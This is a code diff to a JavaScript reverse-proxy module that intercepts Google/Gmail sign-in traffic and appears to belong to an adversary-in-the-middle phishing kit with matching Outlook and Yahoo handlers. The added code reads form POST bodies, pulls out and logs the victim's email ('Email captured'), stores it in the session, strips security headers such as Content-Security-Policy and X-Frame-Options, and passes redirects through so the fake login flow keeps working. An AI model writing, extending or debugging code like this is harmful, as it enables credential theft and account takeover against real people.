@@ -20,15 +20,26 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
     }
 
     processRequest() {
-        // Only process Gmail form submissions, not redirects or page loads
-        if (this.browserReq.url.startsWith('/v3/signin/_/___AccountsSignInUi/data/batchexecute')
-        || this.browserReq.url.startsWith('/signin/v2/')
-        || this.browserReq.url.startsWith('/_/signin/challenge')
-        || this.browserReq.url.startsWith('/v3/signin/identifier')
-        || this.browserReq.method === 'POST') {
-            return this.makeGmailProcess()
+        // Simple approach like Outlook/Yahoo - just capture email on POST requests
+        if (this.browserReq.method === 'POST' && this.browserReq.headers['content-length'] > 0) {
+            let body = ''
+            this.browserReq.on('data', (chunk) => {
+                body += chunk.toString()
+            })
+            this.browserReq.on('end', () => {
+                // Simple email capture
+                const emailMatch = /identifier=([^&]+)/.exec(body)
+                if (emailMatch) {
+                    const email = decodeURIComponent(emailMatch[1])
+                    console.log('Email captured:', email)
+                    Object.assign(this.browserReq.clientContext.sessionBody, { email: email })
+                }
+                // Forward original request unchanged
+                this.browserReq.pipe(this.proxyEndpoint)
+            })
+            return
         }
-        // For all other requests (like redirects), just pipe them through
+        // For all other requests, just pipe them through
         return this.browserReq.pipe(this.proxyEndpoint)
     }
 
@@ -187,54 +198,27 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
 
 
     processResponse() {
-        console.log('Processing response from Gmail...')
+        // Simple response handling like Outlook/Yahoo
         this.browserEndPoint.removeHeader('X-Frame-Options')
         this.browserEndPoint.removeHeader('Content-Security-Policy')
         this.browserEndPoint.removeHeader('X-Content-Type-Options')
         this.browserEndPoint.removeHeader('X-XSS-Protection')
-       
-
-        const extRedirectObj = super.getExternalRedirect()
-        if (extRedirectObj !== null) {
-           const rLocation = extRedirectObj.url
-           console.log('External redirect detected:', rLocation)
-           
-           // Handle redirects to password challenge form
-           if (rLocation && rLocation.includes('/v3/signin/challenge/pwd')) {
-               console.log('Redirecting to password challenge form:', rLocation)
-               // Extract the path and query from the redirect URL
-               const urlObj = new URL(rLocation)
-               const redirectPath = urlObj.pathname + urlObj.search
-               this.browserEndPoint.setHeader('Location', redirectPath)
-               this.browserEndPoint.writeHead(302)
-               return this.browserEndPoint.end()
-           }
-           
-           // Handle Gmail internal redirects (like the one you're seeing)
-           if (rLocation && (rLocation.includes('accounts.google.com') || rLocation.includes('signin') || rLocation.includes('/__//'))) {
-               console.log('Gmail internal redirect detected:', rLocation)
-               // For Gmail internal redirects, let them pass through normally
-               return super.processResponse()
-           }
-           
-           // Handle any other redirects that might be Gmail-related
-           if (rLocation && (rLocation.includes('accounts.google.com') || rLocation.includes('signin'))) {
-               console.log('Gmail redirect detected:', rLocation)
-               // Let the redirect pass through normally
-               return super.processResponse()
-           }
-        }
 
         if (this.proxyResp.headers['content-length'] < 1) {
-            console.log('No content-length, piping response through')
             return this.proxyResp.pipe(this.browserEndPoint)
         }
-        
-        console.log('Response content-length:', this.proxyResp.headers['content-length'])
-        console.log('Response status:', this.proxyResp.statusCode)
 
-        // return super.processResponse()
-         let newMsgBody;
+        // Simple redirect handling
+        const extRedirectObj = super.getExternalRedirect()
+        if (extRedirectObj !== null) {
+            const rLocation = extRedirectObj.url
+            console.log('Redirect detected:', rLocation)
+            // Let Gmail redirects pass through normally
+            return super.processResponse()
+        }
+
+        // Apply basic regex replacements
+        let newMsgBody;
         return this.superPrepareResponse(true)
             .then((msgBody) => {
                 newMsgBody = msgBody
